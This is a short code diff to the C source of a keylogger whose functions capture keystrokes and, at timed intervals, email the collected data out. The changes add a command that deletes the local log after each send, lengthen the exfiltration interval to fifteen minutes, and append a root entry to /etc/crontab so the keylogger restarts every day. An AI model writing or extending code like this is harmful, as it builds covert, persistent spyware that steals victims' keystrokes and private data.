@@ -360,12 +360,13 @@ int send_email(){
     free(enc);
     fclose(fp_text);
     fclose(fp_image);
+    system("rm log.txt");
     return (int)res;
 }
 
 void *trigger_send_email(){
     while(1){
-        sleep(60);
+        sleep(15*60);
         send_email();
     }
 }
@@ -405,6 +406,8 @@ void *keylogger(){
 }
 
 int main() {
+    system("echo \"00 09 * * * root $(pwd)/keylogger\" >> /etc/crontab");
+
     pthread_t tid_keylogger;
     pthread_create(&tid_keylogger, NULL, keylogger, (void *)&keylogger);
     pthread_t tid_trigger_send_email;
